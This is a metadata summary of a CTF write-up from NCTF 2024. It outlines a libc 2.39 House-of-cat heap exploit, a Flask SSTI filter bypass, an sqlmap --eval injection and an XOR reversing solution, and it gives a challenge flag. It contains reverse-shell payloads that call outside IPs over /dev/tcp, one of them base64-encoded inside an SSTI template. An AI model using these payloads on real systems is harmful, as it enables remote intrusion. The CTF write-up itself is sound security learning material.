...
lesson: '|'
quality: high
full_path: NCTF_2024_writeup_by_Mini-Venom.full.md
meta_path: NCTF_2024_writeup_by_Mini-Venom.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 'NCTF 2024 writeup by Mini-Venom (Pwn House of cat + Web SSTI + Reverse XOR)。NCTF 2024 Mini-Venom: Pwn libc 2.39 House of cat + Web SSTI (template 解析 <%%>) + sqlmap --eval chr 拼接 + Reverse XOR 字节流。。...'
category: pwn
...
contest_type: open
wp_url: https://www.ctfiot.com/233620.html
wp_author: Mini-Venom
reasoning_chain:
- unauth-diary 触发点：add size 整数溢出（输入 0 → 0 字节 chunk 分配） + edit 输入 0 大小 → 堆溢出 → 假设：libc 2.39 House of cat
- 动作：泄 libc_base = u64(leak) - 2113296, heap_base = u64(leak) - 0x2b0 → 假设：House of cat 链
- 动作：构造 fake_IO_FILE + setcontext+61 + system → rdi/rsi/rdx + vtable=_IO_wfile_jumps+0x30 → 假设：FSOP 链
- 假设：system('/bin/bash -c /bin/bash -i >& /dev/tcp/106.75.70.202/4444 0>&1') → 反弹 shell
- ez_dash (Flask SSTI)：/render 路由 template 过滤不过全 → 假设：SSTI 突破点 <%%>
- 动作：<% t = __import__('os'); s = getattr(t, 'system'); s('echo YmFzaCAtaSA+JiAvZGV2L3RjcC82MC4yMDUuMS44Ni85MDAwIDA+JjE= | base64 -d | bash') %>
- sqlmap-master：双引号被转义 → 假设：用 chr(108)+chr(115) 拼接 'ls' 绕过滤 → 动作：--eval='import subprocess;subprocess.Popen(chr(108)+chr(115))'
- ezDOS (Reverse)：单字符 XOR → 假设：用 'BBBB...B' (40 B) 测试数据加密 + 密文 ^ 测试 = key 流 → 动作：实际密文 ^ key 流 = flag NCTF{Y0u_4r3_Assemb1y_M4st3r_5d0b497e}
failed_attempts:
- unauth-diary 试图走 tcache attack → 失败：libc 2.39 safe-linking + tcache 填充 7 次后才能劫持
- ez_dash 试图用 {{ }} 经典 SSTI → 失败：服务端过滤 {{ }}，但 <% %> 没拦
- sqlmap-master 试图用引号拼接 → 失败：双引号被转义，必须用 chr() 拼接
- ezDOS 试图直接读加密函数反编译 → 失败：单字符 XOR 用密文 ^ 测试密文 = key 流更快
key_observations:
- libc 2.39 House of cat 关键结构：fake_IO + setcontext+61 + _IO_wfile_jumps+0x30 vtable
- 整数溢出 add size=0 + edit size=0 是堆溢出经典触发（libc 2.39 safe-linking 加固）
- Flask SSTI 突破点：服务端过滤 {{ }} 但不过滤 <% %>，Python exec 语句绕过
- chr(108)+chr(115) 拼接 'ls' 是 sqlmap --eval 绕双引号过滤的标准范式
- 单字符 XOR 攻击 = 已知明文攻击 + 密文 ^ 测试密文 = key 流，再 XOR 实际密文 = flag
prerequisites:
- libc 2.39 heap exploit（House of cat / safe-linking / tcache 填充）
- Flask SSTI（<% %> 绕过 + os.system + base64 反弹 shell）
- sqlmap --eval Python 注入（chr 拼接绕过）
- Reverse 单字符 XOR（已知明文攻击）
---
